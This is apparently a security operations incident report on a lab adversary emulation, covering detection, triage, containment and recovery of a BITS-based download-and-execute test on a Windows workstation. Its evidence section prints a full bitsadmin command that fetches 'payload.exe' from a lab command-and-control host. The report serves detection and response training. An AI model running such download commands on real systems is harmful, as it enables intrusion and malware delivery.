# INC-2026-001 — Suspicious BITS Job Download (Caldera T1-Windows-Download-Exec)

| Field | Value |
|-------|-------|
| **Incident ID** | INC-2026-001 |
| **Ticket** | SEC-48291 |
| **Severity** | P2 — High |
| **Status** | Closed — True Positive (Lab Emulation) |
| **Detection Source** | Wazuh Rule 180001 + Microsoft Defender for Endpoint |
| **Caldera Operation** | `2026-06-17-INC001-BITS-LAB` |
| **MITRE ATT&CK** | T1197 (BITS Jobs), T1105 (Ingress Tool Transfer), T1059.003 (Windows Command Shell) |
| **Analyst** | Praisel Ekpenyong |
| **Lab Environment** | Hybrid — Lab 1 (Wazuh/Sysmon) + Lab 2 (Defender/Sentinel) |

---

## 1. Detection

**2026-06-17 14:22:08 UTC** — Wazuh alert on `WKSTN-042`:

```
Rule: 180001 (level 8) — Suspicious download and execution with BITS job
Agent: wazuh-agent-wkstn-042
MITRE: T1197
```

**14:22:41 UTC** — Microsoft Defender alert: *Suspicious process chain: bitsadmin.exe → cmd.exe*

Praisel Ekpenyong (SOC Analyst L1) acknowledged SEC-48291 within 8 minutes.

---

## 2. Validation

| Check | Result |
|-------|--------|
| Change window / approved script? | No matching change ticket |
| Parent process | `cmd.exe` spawned by unusual parent (non-SCCM) |
| Command line contains `/transfer` and remote URL | Yes — matches BITS download pattern |
| User context | `CORP\jsmith` (standard user, not IT admin) |
| Caldera correlation | Operation `2026-06-17-INC001-BITS-LAB` ability `Download file using BITSAdmin` finished 14:22:06 UTC |

**Determination:** True positive — unauthorized download and execution chain.

---

## 3. Enrichment

### Asset

| Attribute | Value |
|-----------|-------|
| Hostname | WKSTN-042 |
| IP | 10.10.10.42 |
| OS | Windows 10 22H2 |
| Criticality | Medium (finance analyst workstation) |
| EDR status | Online |

### IOC Enrichment

| IOC | Type | Enrichment Result |
|-----|------|-------------------|
| `10.10.30.10:8888` | URL (Caldera C2 lab) | Internal lab host — tagged `caldera-c2-lab` |
| `C:\Users\Public\payload.exe` | File path | Sysmon SHA256: `a3f2...8c1d` (lab sample) |
| `bitsadmin.exe` | Process | Legitimate binary, abused (LOLBIN) |

```powershell
# Enrichment performed
Get-FileHash "C:\Users\Public\payload.exe" -Algorithm SHA256
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 20
```

### Related Alerts (Last 24 hr)

- None on other hosts for same URL (isolated to WKSTN-042)

---

## 4. Containment

| Time (UTC) | Action | Performed By |
|------------|--------|--------------|
| 14:35:00 | Isolated WKSTN-042 via Defender for Endpoint | Praisel Ekpenyong |
| 14:36:00 | Disabled network route to 10.10.30.10:8888 at pfSense (temporary) | Tier 1 |
| 14:40:00 | Reset password for `CORP\jsmith` (precaution) | Tier 1 via helpdesk workflow |

---

## 5. Eradication

| Time (UTC) | Action |
|------------|--------|
| 14:55:00 | Quarantined `payload.exe` via MDE |
| 14:58:00 | Killed residual `sandcat` Caldera agent process |
| 15:05:00 | Removed BITS job: `bitsadmin /list /verbose` → delete orphaned job |
| 15:10:00 | Caldera operation stopped; cleanup abilities confirmed |

---

## 6. Recovery

| Time (UTC) | Action |
|------------|--------|
| 15:30:00 | Full AV scan — clean |
| 15:45:00 | Removed host isolation after T2 review |
| 16:00:00 | User briefed; workstation returned to service |

---

## 7. Escalation

**Escalated to Tier 2 at 14:45 UTC** — Reason: confirmed unauthorized code execution on finance VLAN workstation. T2 validated scope (single host), approved recovery.

**Not escalated to IR team** — No domain admin involvement, no lateral movement observed.

---

## 8. Timeline (UTC)

| Time | Event |
|------|-------|
| 14:20:00 | Caldera operation started (T1-Windows-Download-Exec) |
| 14:22:06 | BITS download ability completed |
| 14:22:08 | Wazuh alert 180001 fired |
| 14:22:15 | Sysmon EID 1 — `bitsadmin.exe /transfer` |
| 14:22:41 | Defender alert correlated |
| 14:30:00 | Tier 1 began investigation |
| 14:35:00 | Host isolated |
| 14:45:00 | Escalated to T2 |
| 15:10:00 | Eradication complete |
| 16:00:00 | Closed |

---

## 9. Evidence

### Sysmon Excerpt (Event ID 1)

```
Image: C:\Windows\System32\bitsadmin.exe
CommandLine: bitsadmin /transfer debjob /download /priority foreground http://10.10.30.10:8888/file/download C:\Users\Public\payload.exe
ParentImage: C:\Windows\System32\cmd.exe
User: CORP\jsmith
```

### Splunk Query Used

```spl
index=sysmon EventCode=1 host=WKSTN-042
| search CommandLine="*bitsadmin*" OR CommandLine="*transfer*"
| table _time User Image CommandLine ParentImage
```

### Sentinel KQL Used

```kql
DeviceProcessEvents
| where DeviceName == "WKSTN-042"
| where Timestamp between (datetime(2026-06-17 14:15:00) .. datetime(2026-06-17 14:30:00))
| where ProcessCommandLine has "bitsadmin"
| project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

---

## 10. Recommendations

1. **Detection** — Add parent-process filter: alert when `bitsadmin` parent is not `svchost.exe` or approved patch tool.
2. **Hardening** — Consider AppLocker rule to restrict `bitsadmin.exe` for standard users.
3. **Monitoring** — Enable PowerShell script block logging on finance VLAN.
4. **Training** — Phishing follow-up for user `jsmith` (linked scenario in `phishing/`).
5. **Lab** — Retain Caldera op ID in detection regression suite quarterly.

---

## 11. Analyst Notes

This incident was triggered by controlled Caldera emulation to validate Wazuh rule 180001 and Defender correlation. Production analysts would follow identical triage steps minus the Caldera operation ID field.